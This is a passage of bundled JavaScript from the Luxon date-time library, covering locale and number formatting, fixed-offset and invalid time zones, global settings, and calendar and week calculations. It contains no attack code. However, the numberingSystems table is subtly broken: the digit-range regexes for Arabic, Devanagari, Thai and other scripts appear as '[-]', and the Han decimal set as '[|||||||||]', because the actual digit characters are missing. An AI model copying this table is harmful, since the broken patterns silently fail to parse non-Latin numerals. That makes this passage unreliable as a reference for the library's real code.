    if (!localeStr.includes("-u-")) {
      localeStr += "-u";
    }
    if (outputCalendar) {
      localeStr += `-ca-${outputCalendar}`;
    }
    if (numberingSystem) {
      localeStr += `-nu-${numberingSystem}`;
    }
    return localeStr;
  } else {
    return localeStr;
  }
}
function mapMonths(f) {
  const ms = [];
  for (let i2 = 1; i2 <= 12; i2++) {
    const dt = DateTime.utc(2009, i2, 1);
    ms.push(f(dt));
  }
  return ms;
}
function mapWeekdays(f) {
  const ms = [];
  for (let i2 = 1; i2 <= 7; i2++) {
    const dt = DateTime.utc(2016, 11, 13 + i2);
    ms.push(f(dt));
  }
  return ms;
}
function listStuff(loc, length, englishFn, intlFn) {
  const mode = loc.listingMode();
  if (mode === "error") {
    return null;
  } else if (mode === "en") {
    return englishFn(length);
  } else {
    return intlFn(length);
  }
}
function supportsFastNumbers(loc) {
  if (loc.numberingSystem && loc.numberingSystem !== "latn") {
    return false;
  } else {
    return loc.numberingSystem === "latn" || !loc.locale || loc.locale.startsWith("en") || new Intl.DateTimeFormat(loc.intl).resolvedOptions().numberingSystem === "latn";
  }
}
class PolyNumberFormatter {
  constructor(intl, forceSimple, opts) {
    this.padTo = opts.padTo || 0;
    this.floor = opts.floor || false;
    const { padTo, floor, ...otherOpts } = opts;
    if (!forceSimple || Object.keys(otherOpts).length > 0) {
      const intlOpts = { useGrouping: false, ...opts };
      if (opts.padTo > 0) intlOpts.minimumIntegerDigits = opts.padTo;
      this.inf = getCachedINF(intl, intlOpts);
    }
  }
  format(i2) {
    if (this.inf) {
      const fixed = this.floor ? Math.floor(i2) : i2;
      return this.inf.format(fixed);
    } else {
      const fixed = this.floor ? Math.floor(i2) : roundTo(i2, 3);
      return padStart(fixed, this.padTo);
    }
  }
}
class PolyDateFormatter {
  constructor(dt, intl, opts) {
    this.opts = opts;
    this.originalZone = void 0;
    let z = void 0;
    if (this.opts.timeZone) {
      this.dt = dt;
    } else if (dt.zone.type === "fixed") {
      const gmtOffset = -1 * (dt.offset / 60);
      const offsetZ = gmtOffset >= 0 ? `Etc/GMT+${gmtOffset}` : `Etc/GMT${gmtOffset}`;
      if (dt.offset !== 0 && IANAZone.create(offsetZ).valid) {
        z = offsetZ;
        this.dt = dt;
      } else {
        z = "UTC";
        this.dt = dt.offset === 0 ? dt : dt.setZone("UTC").plus({ minutes: dt.offset });
        this.originalZone = dt.zone;
      }
    } else if (dt.zone.type === "system") {
      this.dt = dt;
    } else if (dt.zone.type === "iana") {
      this.dt = dt;
      z = dt.zone.name;
    } else {
      z = "UTC";
      this.dt = dt.setZone("UTC").plus({ minutes: dt.offset });
      this.originalZone = dt.zone;
    }
    const intlOpts = { ...this.opts };
    intlOpts.timeZone = intlOpts.timeZone || z;
    this.dtf = getCachedDTF(intl, intlOpts);
  }
  format() {
    if (this.originalZone) {
      return this.formatToParts().map(({ value }) => value).join("");
    }
    return this.dtf.format(this.dt.toJSDate());
  }
  formatToParts() {
    const parts = this.dtf.formatToParts(this.dt.toJSDate());
    if (this.originalZone) {
      return parts.map((part) => {
        if (part.type === "timeZoneName") {
          const offsetName = this.originalZone.offsetName(this.dt.ts, {
            locale: this.dt.locale,
            format: this.opts.timeZoneName
          });
          return {
            ...part,
            value: offsetName
          };
        } else {
          return part;
        }
      });
    }
    return parts;
  }
  resolvedOptions() {
    return this.dtf.resolvedOptions();
  }
}
class PolyRelFormatter {
  constructor(intl, isEnglish, opts) {
    this.opts = { style: "long", ...opts };
    if (!isEnglish && hasRelative()) {
      this.rtf = getCachedRTF(intl, opts);
    }
  }
  format(count, unit) {
    if (this.rtf) {
      return this.rtf.format(count, unit);
    } else {
      return formatRelativeTime(unit, count, this.opts.numeric, this.opts.style !== "long");
    }
  }
  formatToParts(count, unit) {
    if (this.rtf) {
      return this.rtf.formatToParts(count, unit);
    } else {
      return [];
    }
  }
}
const fallbackWeekSettings = {
  firstDay: 1,
  minimalDays: 4,
  weekend: [6, 7]
};
class Locale {
  static fromOpts(opts) {
    return Locale.create(
      opts.locale,
      opts.numberingSystem,
      opts.outputCalendar,
      opts.weekSettings,
      opts.defaultToEN
    );
  }
  static create(locale, numberingSystem, outputCalendar, weekSettings, defaultToEN = false) {
    const specifiedLocale = locale || Settings.defaultLocale;
    const localeR = specifiedLocale || (defaultToEN ? "en-US" : systemLocale());
    const numberingSystemR = numberingSystem || Settings.defaultNumberingSystem;
    const outputCalendarR = outputCalendar || Settings.defaultOutputCalendar;
    const weekSettingsR = validateWeekSettings(weekSettings) || Settings.defaultWeekSettings;
    return new Locale(localeR, numberingSystemR, outputCalendarR, weekSettingsR, specifiedLocale);
  }
  static resetCache() {
    sysLocaleCache = null;
    intlDTCache = {};
    intlNumCache = {};
    intlRelCache = {};
  }
  static fromObject({ locale, numberingSystem, outputCalendar, weekSettings } = {}) {
    return Locale.create(locale, numberingSystem, outputCalendar, weekSettings);
  }
  constructor(locale, numbering, outputCalendar, weekSettings, specifiedLocale) {
    const [parsedLocale, parsedNumberingSystem, parsedOutputCalendar] = parseLocaleString(locale);
    this.locale = parsedLocale;
    this.numberingSystem = numbering || parsedNumberingSystem || null;
    this.outputCalendar = outputCalendar || parsedOutputCalendar || null;
    this.weekSettings = weekSettings;
    this.intl = intlConfigString(this.locale, this.numberingSystem, this.outputCalendar);
    this.weekdaysCache = { format: {}, standalone: {} };
    this.monthsCache = { format: {}, standalone: {} };
    this.meridiemCache = null;
    this.eraCache = {};
    this.specifiedLocale = specifiedLocale;
    this.fastNumbersCached = null;
  }
  get fastNumbers() {
    if (this.fastNumbersCached == null) {
      this.fastNumbersCached = supportsFastNumbers(this);
    }
    return this.fastNumbersCached;
  }
  listingMode() {
    const isActuallyEn = this.isEnglish();
    const hasNoWeirdness = (this.numberingSystem === null || this.numberingSystem === "latn") && (this.outputCalendar === null || this.outputCalendar === "gregory");
    return isActuallyEn && hasNoWeirdness ? "en" : "intl";
  }
  clone(alts) {
    if (!alts || Object.getOwnPropertyNames(alts).length === 0) {
      return this;
    } else {
      return Locale.create(
        alts.locale || this.specifiedLocale,
        alts.numberingSystem || this.numberingSystem,
        alts.outputCalendar || this.outputCalendar,
        validateWeekSettings(alts.weekSettings) || this.weekSettings,
        alts.defaultToEN || false
      );
    }
  }
  redefaultToEN(alts = {}) {
    return this.clone({ ...alts, defaultToEN: true });
  }
  redefaultToSystem(alts = {}) {
    return this.clone({ ...alts, defaultToEN: false });
  }
  months(length, format = false) {
    return listStuff(this, length, months, () => {
      const intl = format ? { month: length, day: "numeric" } : { month: length }, formatStr = format ? "format" : "standalone";
      if (!this.monthsCache[formatStr][length]) {
        this.monthsCache[formatStr][length] = mapMonths((dt) => this.extract(dt, intl, "month"));
      }
      return this.monthsCache[formatStr][length];
    });
  }
  weekdays(length, format = false) {
    return listStuff(this, length, weekdays, () => {
      const intl = format ? { weekday: length, year: "numeric", month: "long", day: "numeric" } : { weekday: length }, formatStr = format ? "format" : "standalone";
      if (!this.weekdaysCache[formatStr][length]) {
        this.weekdaysCache[formatStr][length] = mapWeekdays(
          (dt) => this.extract(dt, intl, "weekday")
        );
      }
      return this.weekdaysCache[formatStr][length];
    });
  }
  meridiems() {
    return listStuff(
      this,
      void 0,
      () => meridiems,
      () => {
        if (!this.meridiemCache) {
          const intl = { hour: "numeric", hourCycle: "h12" };
          this.meridiemCache = [DateTime.utc(2016, 11, 13, 9), DateTime.utc(2016, 11, 13, 19)].map(
            (dt) => this.extract(dt, intl, "dayperiod")
          );
        }
        return this.meridiemCache;
      }
    );
  }
  eras(length) {
    return listStuff(this, length, eras, () => {
      const intl = { era: length };
      if (!this.eraCache[length]) {
        this.eraCache[length] = [DateTime.utc(-40, 1, 1), DateTime.utc(2017, 1, 1)].map(
          (dt) => this.extract(dt, intl, "era")
        );
      }
      return this.eraCache[length];
    });
  }
  extract(dt, intlOpts, field) {
    const df = this.dtFormatter(dt, intlOpts), results = df.formatToParts(), matching = results.find((m3) => m3.type.toLowerCase() === field);
    return matching ? matching.value : null;
  }
  numberFormatter(opts = {}) {
    return new PolyNumberFormatter(this.intl, opts.forceSimple || this.fastNumbers, opts);
  }
  dtFormatter(dt, intlOpts = {}) {
    return new PolyDateFormatter(dt, this.intl, intlOpts);
  }
  relFormatter(opts = {}) {
    return new PolyRelFormatter(this.intl, this.isEnglish(), opts);
  }
  listFormatter(opts = {}) {
    return getCachedLF(this.intl, opts);
  }
  isEnglish() {
    return this.locale === "en" || this.locale.toLowerCase() === "en-us" || new Intl.DateTimeFormat(this.intl).resolvedOptions().locale.startsWith("en-us");
  }
  getWeekSettings() {
    if (this.weekSettings) {
      return this.weekSettings;
    } else if (!hasLocaleWeekInfo()) {
      return fallbackWeekSettings;
    } else {
      return getCachedWeekInfo(this.locale);
    }
  }
  getStartOfWeek() {
    return this.getWeekSettings().firstDay;
  }
  getMinDaysInFirstWeek() {
    return this.getWeekSettings().minimalDays;
  }
  getWeekendDays() {
    return this.getWeekSettings().weekend;
  }
  equals(other) {
    return this.locale === other.locale && this.numberingSystem === other.numberingSystem && this.outputCalendar === other.outputCalendar;
  }
  toString() {
    return `Locale(${this.locale}, ${this.numberingSystem}, ${this.outputCalendar})`;
  }
}
let singleton = null;
class FixedOffsetZone extends Zone {
  /**
   * Get a singleton instance of UTC
   * @return {FixedOffsetZone}
   */
  static get utcInstance() {
    if (singleton === null) {
      singleton = new FixedOffsetZone(0);
    }
    return singleton;
  }
  /**
   * Get an instance with a specified offset
   * @param {number} offset - The offset in minutes
   * @return {FixedOffsetZone}
   */
  static instance(offset2) {
    return offset2 === 0 ? FixedOffsetZone.utcInstance : new FixedOffsetZone(offset2);
  }
  /**
   * Get an instance of FixedOffsetZone from a UTC offset string, like "UTC+6"
   * @param {string} s - The offset string to parse
   * @example FixedOffsetZone.parseSpecifier("UTC+6")
   * @example FixedOffsetZone.parseSpecifier("UTC+06")
   * @example FixedOffsetZone.parseSpecifier("UTC-6:00")
   * @return {FixedOffsetZone}
   */
  static parseSpecifier(s2) {
    if (s2) {
      const r = s2.match(/^utc(?:([+-]\d{1,2})(?::(\d{2}))?)?$/i);
      if (r) {
        return new FixedOffsetZone(signedOffset(r[1], r[2]));
      }
    }
    return null;
  }
  constructor(offset2) {
    super();
    this.fixed = offset2;
  }
  /**
   * The type of zone. `fixed` for all instances of `FixedOffsetZone`.
   * @override
   * @type {string}
   */
  get type() {
    return "fixed";
  }
  /**
   * The name of this zone.
   * All fixed zones' names always start with "UTC" (plus optional offset)
   * @override
   * @type {string}
   */
  get name() {
    return this.fixed === 0 ? "UTC" : `UTC${formatOffset(this.fixed, "narrow")}`;
  }
  /**
   * The IANA name of this zone, i.e. `Etc/UTC` or `Etc/GMT+/-nn`
   *
   * @override
   * @type {string}
   */
  get ianaName() {
    if (this.fixed === 0) {
      return "Etc/UTC";
    } else {
      return `Etc/GMT${formatOffset(-this.fixed, "narrow")}`;
    }
  }
  /**
   * Returns the offset's common name at the specified timestamp.
   *
   * For fixed offset zones this equals to the zone name.
   * @override
   */
  offsetName() {
    return this.name;
  }
  /**
   * Returns the offset's value as a string
   * @override
   * @param {number} ts - Epoch milliseconds for which to get the offset
   * @param {string} format - What style of offset to return.
   *                          Accepts 'narrow', 'short', or 'techie'. Returning '+6', '+06:00', or '+0600' respectively
   * @return {string}
   */
  formatOffset(ts, format) {
    return formatOffset(this.fixed, format);
  }
  /**
   * Returns whether the offset is known to be fixed for the whole year:
   * Always returns true for all fixed offset zones.
   * @override
   * @type {boolean}
   */
  get isUniversal() {
    return true;
  }
  /**
   * Return the offset in minutes for this zone at the specified timestamp.
   *
   * For fixed offset zones, this is constant and does not depend on a timestamp.
   * @override
   * @return {number}
   */
  offset() {
    return this.fixed;
  }
  /**
   * Return whether this Zone is equal to another zone (i.e. also fixed and same offset)
   * @override
   * @param {Zone} otherZone - the zone to compare
   * @return {boolean}
   */
  equals(otherZone) {
    return otherZone.type === "fixed" && otherZone.fixed === this.fixed;
  }
  /**
   * Return whether this Zone is valid:
   * All fixed offset zones are valid.
   * @override
   * @type {boolean}
   */
  get isValid() {
    return true;
  }
}
class InvalidZone extends Zone {
  constructor(zoneName) {
    super();
    this.zoneName = zoneName;
  }
  /** @override **/
  get type() {
    return "invalid";
  }
  /** @override **/
  get name() {
    return this.zoneName;
  }
  /** @override **/
  get isUniversal() {
    return false;
  }
  /** @override **/
  offsetName() {
    return null;
  }
  /** @override **/
  formatOffset() {
    return "";
  }
  /** @override **/
  offset() {
    return NaN;
  }
  /** @override **/
  equals() {
    return false;
  }
  /** @override **/
  get isValid() {
    return false;
  }
}
function normalizeZone(input2, defaultZone2) {
  if (isUndefined(input2) || input2 === null) {
    return defaultZone2;
  } else if (input2 instanceof Zone) {
    return input2;
  } else if (isString(input2)) {
    const lowered = input2.toLowerCase();
    if (lowered === "default") return defaultZone2;
    else if (lowered === "local" || lowered === "system") return SystemZone.instance;
    else if (lowered === "utc" || lowered === "gmt") return FixedOffsetZone.utcInstance;
    else return FixedOffsetZone.parseSpecifier(lowered) || IANAZone.create(input2);
  } else if (isNumber(input2)) {
    return FixedOffsetZone.instance(input2);
  } else if (typeof input2 === "object" && "offset" in input2 && typeof input2.offset === "function") {
    return input2;
  } else {
    return new InvalidZone(input2);
  }
}
const numberingSystems = {
  arab: "[-]",
  arabext: "[-]",
  bali: "[-]",
  beng: "[-]",
  deva: "[-]",
  fullwide: "[-]",
  gujr: "[-]",
  hanidec: "[|||||||||]",
  khmr: "[-]",
  knda: "[-]",
  laoo: "[-]",
  limb: "[-]",
  mlym: "[-]",
  mong: "[-]",
  mymr: "[-]",
  orya: "[-]",
  tamldec: "[-]",
  telu: "[-]",
  thai: "[-]",
  tibt: "[-]",
  latn: "\\d"
};
const numberingSystemsUTF16 = {
  arab: [1632, 1641],
  arabext: [1776, 1785],
  bali: [6992, 7001],
  beng: [2534, 2543],
  deva: [2406, 2415],
  fullwide: [65296, 65303],
  gujr: [2790, 2799],
  khmr: [6112, 6121],
  knda: [3302, 3311],
  laoo: [3792, 3801],
  limb: [6470, 6479],
  mlym: [3430, 3439],
  mong: [6160, 6169],
  mymr: [4160, 4169],
  orya: [2918, 2927],
  tamldec: [3046, 3055],
  telu: [3174, 3183],
  thai: [3664, 3673],
  tibt: [3872, 3881]
};
const hanidecChars = numberingSystems.hanidec.replace(/[\[|\]]/g, "").split("");
function parseDigits(str) {
  let value = parseInt(str, 10);
  if (isNaN(value)) {
    value = "";
    for (let i2 = 0; i2 < str.length; i2++) {
      const code = str.charCodeAt(i2);
      if (str[i2].search(numberingSystems.hanidec) !== -1) {
        value += hanidecChars.indexOf(str[i2]);
      } else {
        for (const key in numberingSystemsUTF16) {
          const [min2, max2] = numberingSystemsUTF16[key];
          if (code >= min2 && code <= max2) {
            value += code - min2;
          }
        }
      }
    }
    return parseInt(value, 10);
  } else {
    return value;
  }
}
let digitRegexCache = {};
function resetDigitRegexCache() {
  digitRegexCache = {};
}
function digitRegex({ numberingSystem }, append = "") {
  const ns = numberingSystem || "latn";
  if (!digitRegexCache[ns]) {
    digitRegexCache[ns] = {};
  }
  if (!digitRegexCache[ns][append]) {
    digitRegexCache[ns][append] = new RegExp(`${numberingSystems[ns]}${append}`);
  }
  return digitRegexCache[ns][append];
}
let now = () => Date.now(), defaultZone = "system", defaultLocale = null, defaultNumberingSystem = null, defaultOutputCalendar = null, twoDigitCutoffYear = 60, throwOnInvalid, defaultWeekSettings = null;
class Settings {
  /**
   * Get the callback for returning the current timestamp.
   * @type {function}
   */
  static get now() {
    return now;
  }
  /**
   * Set the callback for returning the current timestamp.
   * The function should return a number, which will be interpreted as an Epoch millisecond count
   * @type {function}
   * @example Settings.now = () => Date.now() + 3000 // pretend it is 3 seconds in the future
   * @example Settings.now = () => 0 // always pretend it's Jan 1, 1970 at midnight in UTC time
   */
  static set now(n2) {
    now = n2;
  }
  /**
   * Set the default time zone to create DateTimes in. Does not affect existing instances.
   * Use the value "system" to reset this value to the system's time zone.
   * @type {string}
   */
  static set defaultZone(zone) {
    defaultZone = zone;
  }
  /**
   * Get the default time zone object currently used to create DateTimes. Does not affect existing instances.
   * The default value is the system's time zone (the one set on the machine that runs this code).
   * @type {Zone}
   */
  static get defaultZone() {
    return normalizeZone(defaultZone, SystemZone.instance);
  }
  /**
   * Get the default locale to create DateTimes with. Does not affect existing instances.
   * @type {string}
   */
  static get defaultLocale() {
    return defaultLocale;
  }
  /**
   * Set the default locale to create DateTimes with. Does not affect existing instances.
   * @type {string}
   */
  static set defaultLocale(locale) {
    defaultLocale = locale;
  }
  /**
   * Get the default numbering system to create DateTimes with. Does not affect existing instances.
   * @type {string}
   */
  static get defaultNumberingSystem() {
    return defaultNumberingSystem;
  }
  /**
   * Set the default numbering system to create DateTimes with. Does not affect existing instances.
   * @type {string}
   */
  static set defaultNumberingSystem(numberingSystem) {
    defaultNumberingSystem = numberingSystem;
  }
  /**
   * Get the default output calendar to create DateTimes with. Does not affect existing instances.
   * @type {string}
   */
  static get defaultOutputCalendar() {
    return defaultOutputCalendar;
  }
  /**
   * Set the default output calendar to create DateTimes with. Does not affect existing instances.
   * @type {string}
   */
  static set defaultOutputCalendar(outputCalendar) {
    defaultOutputCalendar = outputCalendar;
  }
  /**
   * @typedef {Object} WeekSettings
   * @property {number} firstDay
   * @property {number} minimalDays
   * @property {number[]} weekend
   */
  /**
   * @return {WeekSettings|null}
   */
  static get defaultWeekSettings() {
    return defaultWeekSettings;
  }
  /**
   * Allows overriding the default locale week settings, i.e. the start of the week, the weekend and
   * how many days are required in the first week of a year.
   * Does not affect existing instances.
   *
   * @param {WeekSettings|null} weekSettings
   */
  static set defaultWeekSettings(weekSettings) {
    defaultWeekSettings = validateWeekSettings(weekSettings);
  }
  /**
   * Get the cutoff year for whether a 2-digit year string is interpreted in the current or previous century. Numbers higher than the cutoff will be considered to mean 19xx and numbers lower or equal to the cutoff will be considered 20xx.
   * @type {number}
   */
  static get twoDigitCutoffYear() {
    return twoDigitCutoffYear;
  }
  /**
   * Set the cutoff year for whether a 2-digit year string is interpreted in the current or previous century. Numbers higher than the cutoff will be considered to mean 19xx and numbers lower or equal to the cutoff will be considered 20xx.
   * @type {number}
   * @example Settings.twoDigitCutoffYear = 0 // all 'yy' are interpreted as 20th century
   * @example Settings.twoDigitCutoffYear = 99 // all 'yy' are interpreted as 21st century
   * @example Settings.twoDigitCutoffYear = 50 // '49' -> 2049; '50' -> 1950
   * @example Settings.twoDigitCutoffYear = 1950 // interpreted as 50
   * @example Settings.twoDigitCutoffYear = 2050 // ALSO interpreted as 50
   */
  static set twoDigitCutoffYear(cutoffYear) {
    twoDigitCutoffYear = cutoffYear % 100;
  }
  /**
   * Get whether Luxon will throw when it encounters invalid DateTimes, Durations, or Intervals
   * @type {boolean}
   */
  static get throwOnInvalid() {
    return throwOnInvalid;
  }
  /**
   * Set whether Luxon will throw when it encounters invalid DateTimes, Durations, or Intervals
   * @type {boolean}
   */
  static set throwOnInvalid(t) {
    throwOnInvalid = t;
  }
  /**
   * Reset Luxon's global caches. Should only be necessary in testing scenarios.
   * @return {void}
   */
  static resetCaches() {
    Locale.resetCache();
    IANAZone.resetCache();
    DateTime.resetCache();
    resetDigitRegexCache();
  }
}
class Invalid {
  constructor(reason, explanation) {
    this.reason = reason;
    this.explanation = explanation;
  }
  toMessage() {
    if (this.explanation) {
      return `${this.reason}: ${this.explanation}`;
    } else {
      return this.reason;
    }
  }
}
const nonLeapLadder = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334], leapLadder = [0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335];
function unitOutOfRange(unit, value) {
  return new Invalid(
    "unit out of range",
    `you specified ${value} (of type ${typeof value}) as a ${unit}, which is invalid`
  );
}
function dayOfWeek(year, month, day) {
  const d3 = new Date(Date.UTC(year, month - 1, day));
  if (year < 100 && year >= 0) {
    d3.setUTCFullYear(d3.getUTCFullYear() - 1900);
  }
  const js = d3.getUTCDay();
  return js === 0 ? 7 : js;
}
function computeOrdinal(year, month, day) {
  return day + (isLeapYear(year) ? leapLadder : nonLeapLadder)[month - 1];
}
function uncomputeOrdinal(year, ordinal) {
  const table = isLeapYear(year) ? leapLadder : nonLeapLadder, month0 = table.findIndex((i2) => i2 < ordinal), day = ordinal - table[month0];
  return { month: month0 + 1, day };
}
function isoWeekdayToLocal(isoWeekday, startOfWeek) {
  return (isoWeekday - startOfWeek + 7) % 7 + 1;
}
function gregorianToWeek(gregObj, minDaysInFirstWeek = 4, startOfWeek = 1) {
  const { year, month, day } = gregObj, ordinal = computeOrdinal(year, month, day), weekday = isoWeekdayToLocal(dayOfWeek(year, month, day), startOfWeek);
  let weekNumber = Math.floor((ordinal - weekday + 14 - minDaysInFirstWeek) / 7), weekYear;
  if (weekNumber < 1) {
    weekYear = year - 1;
    weekNumber = weeksInWeekYear(weekYear, minDaysInFirstWeek, startOfWeek);
  } else if (weekNumber > weeksInWeekYear(year, minDaysInFirstWeek, startOfWeek)) {
    weekYear = year + 1;
    weekNumber = 1;
  } else {
    weekYear = year;
  }
  return { weekYear, weekNumber, weekday, ...timeObject(gregObj) };
}
function weekToGregorian(weekData, minDaysInFirstWeek = 4, startOfWeek = 1) {
  const { weekYear, weekNumber, weekday } = weekData, weekdayOfJan4 = isoWeekdayToLocal(dayOfWeek(weekYear, 1, minDaysInFirstWeek), startOfWeek), yearInDays = daysInYear(weekYear);
  let ordinal = weekNumber * 7 + weekday - weekdayOfJan4 - 7 + minDaysInFirstWeek, year;
  if (ordinal < 1) {
    year = weekYear - 1;
    ordinal += daysInYear(year);
  } else if (ordinal > yearInDays) {
    year = weekYear + 1;
    ordinal -= daysInYear(weekYear);
  } else {
    year = weekYear;
  }
  const { month, day } = uncomputeOrdinal(year, ordinal);
  return { year, month, day, ...timeObject(weekData) };
}
function gregorianToOrdinal(gregData) {
  const { year, month, day } = gregData;
  const ordinal = computeOrdinal(year, month, day);
  return { year, ordinal, ...timeObject(gregData) };
}
function ordinalToGregorian(ordinalData) {
  const { year, ordinal } = ordinalData;
  const { month, day } = uncomputeOrdinal(year, ordinal);
  return { year, month, day, ...timeObject(ordinalData) };
}
function usesLocalWeekValues(obj, loc) {
  const hasLocaleWeekData = !isUndefined(obj.localWeekday) || !isUndefined(obj.localWeekNumber) || !isUndefined(obj.localWeekYear);
  if (hasLocaleWeekData) {
    const hasIsoWeekData = !isUndefined(obj.weekday) || !isUndefined(obj.weekNumber) || !isUndefined(obj.weekYear);
    if (hasIsoWeekData) {
      throw new ConflictingSpecificationError(
        "Cannot mix locale-based week fields with ISO-based week fields"
      );
    }
    if (!isUndefined(obj.localWeekday)) obj.weekday = obj.localWeekday;
    if (!isUndefined(obj.localWeekNumber)) obj.weekNumber = obj.localWeekNumber;
    if (!isUndefined(obj.localWeekYear)) obj.weekYear = obj.localWeekYear;
    delete obj.localWeekday;
    delete obj.localWeekNumber;
    delete obj.localWeekYear;
    return {
      minDaysInFirstWeek: loc.getMinDaysInFirstWeek(),
      startOfWeek: loc.getStartOfWeek()
    };
  } else {
    return { minDaysInFirstWeek: 4, startOfWeek: 1 };
  }
}
function hasInvalidWeekData(obj, minDaysInFirstWeek = 4, startOfWeek = 1) {
  const validYear = isInteger(obj.weekYear), validWeek = integerBetween(
    obj.weekNumber,
    1,
    weeksInWeekYear(obj.weekYear, minDaysInFirstWeek, startOfWeek)
  ), validWeekday = integerBetween(obj.weekday, 1, 7);
  if (!validYear) {
    return unitOutOfRange("weekYear", obj.weekYear);
  } else if (!validWeek) {
    return unitOutOfRange("week", obj.weekNumber);
  } else if (!validWeekday) {
    return unitOutOfRange("weekday", obj.weekday);
  } else return false;
}
function hasInvalidOrdinalData(obj) {
  const validYear = isInteger(obj.year), validOrdinal = integerBetween(obj.ordinal, 1, daysInYear(obj.year));
  if (!validYear) {
    return unitOutOfRange("year", obj.year);
  } else if (!validOrdinal) {
    return unitOutOfRange("ordinal", obj.ordinal);
  } else return false;
}
function hasInvalidGregorianData(obj) {
  const validYear = isInteger(obj.year), validMonth = integerBetween(obj.month, 1, 12), validDay = integerBetween(obj.day, 1, daysInMonth(obj.year, obj.month));
  if (!validYear) {
    return unitOutOfRange("year", obj.year);
  } else if (!validMonth) {
    return unitOutOfRange("month", obj.month);
  } else if (!validDay) {
    return unitOutOfRange("day", obj.day);
  } else return false;
}
function hasInvalidTimeData(obj) {
  const { hour, minute, second, millisecond } = obj;
  const validHour = integerBetween(hour, 0, 23) || hour === 24 && minute === 0 && second === 0 && millisecond === 0, validMinute = integerBetween(minute, 0, 59), validSecond = integerBetween(second, 0, 59), validMillisecond = integerBetween(millisecond, 0, 999);
  if (!validHour) {
    return unitOutOfRange("hour", hour);
  } else if (!validMinute) {
    return unitOutOfRange("minute", minute);
  } else if (!validSecond) {
    return unitOutOfRange("second", second);
  } else if (!validMillisecond) {
    return unitOutOfRange("millisecond", millisecond);
  } else return false;
}
function isUndefined(o) {
  return typeof o === "undefined";
}
function isNumber(o) {
  return typeof o === "number";
}
function isInteger(o) {
  return typeof o === "number" && o % 1 === 0;
}
function isString(o) {
  return typeof o === "string";
}
function isDate(o) {
  return Object.prototype.toString.call(o) === "[object Date]";
}
function hasRelative() {
  try {
    return typeof Intl !== "undefined" && !!Intl.RelativeTimeFormat;
  } catch (e2) {
    return false;
  }
}
function hasLocaleWeekInfo() {
  try {
    return typeof Intl !== "undefined" && !!Intl.Locale && ("weekInfo" in Intl.Locale.prototype || "getWeekInfo" in Intl.Locale.prototype);
  } catch (e2) {
    return false;
  }
}
function maybeArray(thing) {
  return Array.isArray(thing) ? thing : [thing];
}
function bestBy(arr, by, compare) {
  if (arr.length === 0) {
    return void 0;
  }
  return arr.reduce((best, next) => {
    const pair = [by(next), next];
    if (!best) {
      return pair;
    } else if (compare(best[0], pair[0]) === best[0]) {
      return best;
    } else {
      return pair;
    }
  }, null)[1];
}
function pick(obj, keys) {
  return keys.reduce((a, k) => {
    a[k] = obj[k];
    return a;
  }, {});
}
function hasOwnProperty(obj, prop) {
  return Object.prototype.hasOwnProperty.call(obj, prop);
}
function validateWeekSettings(settings) {
  if (settings == null) {
    return null;
  } else if (typeof settings !== "object") {
    throw new InvalidArgumentError("Week settings must be an object");
  } else {
    if (!integerBetween(settings.firstDay, 1, 7) || !integerBetween(settings.minimalDays, 1, 7) || !Array.isArray(settings.weekend) || settings.weekend.some((v) => !integerBetween(v, 1, 7))) {
      throw new InvalidArgumentError("Invalid week settings");
    }
    return {
      firstDay: settings.firstDay,
      minimalDays: settings.minimalDays,
      weekend: Array.from(settings.weekend)
    };
  }
}
function integerBetween(thing, bottom2, top2) {
  return isInteger(thing) && thing >= bottom2 && thing <= top2;
}
function floorMod(x, n2) {
  return x - n2 * Math.floor(x / n2);
}
function padStart(input2, n2 = 2) {
  const isNeg = input2 < 0;
  let padded;
  if (isNeg) {
    padded = "-" + ("" + -input2).padStart(n2, "0");
  } else {
    padded = ("" + input2).padStart(n2, "0");
  }
  return padded;
}
function parseInteger(string2) {
  if (isUndefined(string2) || string2 === null || string2 === "") {
    return void 0;
  } else {
    return parseInt(string2, 10);
  }
}
function parseFloating(string2) {
  if (isUndefined(string2) || string2 === null || string2 === "") {
    return void 0;
  } else {
    return parseFloat(string2);
  }
}
function parseMillis(fraction) {
  if (isUndefined(fraction) || fraction === null || fraction === "") {
    return void 0;
  } else {
    const f = parseFloat("0." + fraction) * 1e3;
    return Math.floor(f);
  }
}
function roundTo(number2, digits, towardZero = false) {
  const factor = 10 ** digits, rounder = towardZero ? Math.trunc : Math.round;
  return rounder(number2 * factor) / factor;
}
function isLeapYear(year) {
  return year % 4 === 0 && (year % 100 !== 0 || year % 400 === 0);
}
function daysInYear(year) {
  return isLeapYear(year) ? 366 : 365;
}
function daysInMonth(year, month) {
  const modMonth = floorMod(month - 1, 12) + 1, modYear = year + (month - modMonth) / 12;
  if (modMonth === 2) {
    return isLeapYear(modYear) ? 29 : 28;
  } else {
    return [31, null, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][modMonth - 1];
  }
}
function objToLocalTS(obj) {
  let d3 = Date.UTC(
    obj.year,
    obj.month - 1,
    obj.day,
    obj.hour,
    obj.minute,
    obj.second,
    obj.millisecond
  );
  if (obj.year < 100 && obj.year >= 0) {
    d3 = new Date(d3);
    d3.setUTCFullYear(obj.year, obj.month - 1, obj.day);
  }
  return +d3;
}
function firstWeekOffset(year, minDaysInFirstWeek, startOfWeek) {
  const fwdlw = isoWeekdayToLocal(dayOfWeek(year, 1, minDaysInFirstWeek), startOfWeek);
  return -fwdlw + minDaysInFirstWeek - 1;
}
function weeksInWeekYear(weekYear, minDaysInFirstWeek = 4, startOfWeek = 1) {
  const weekOffset = firstWeekOffset(weekYear, minDaysInFirstWeek, startOfWeek);
  const weekOffsetNext = firstWeekOffset(weekYear + 1, minDaysInFirstWeek, startOfWeek);
  return (daysInYear(weekYear) - weekOffset + weekOffsetNext) / 7;
}
function untruncateYear(year) {
  if (year > 99) {
    return year;
  } else return year > Settings.twoDigitCutoffYear ? 1900 + year : 2e3 + year;
}
function parseZoneInfo(ts, offsetFormat, locale, timeZone = null) {
  const date2 = new Date(ts), intlOpts = {
    hourCycle: "h23",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit"
  };
  if (timeZone) {
    intlOpts.timeZone = timeZone;
  }
  const modified = { timeZoneName: offsetFormat, ...intlOpts };
  const parsed = new Intl.DateTimeFormat(locale, modified).formatToParts(date2).find((m3) => m3.type.toLowerCase() === "timezonename");
  return parsed ? parsed.value : null;
}
function signedOffset(offHourStr, offMinuteStr) {
  let offHour = parseInt(offHourStr, 10);
  if (Number.isNaN(offHour)) {
    offHour = 0;
  }
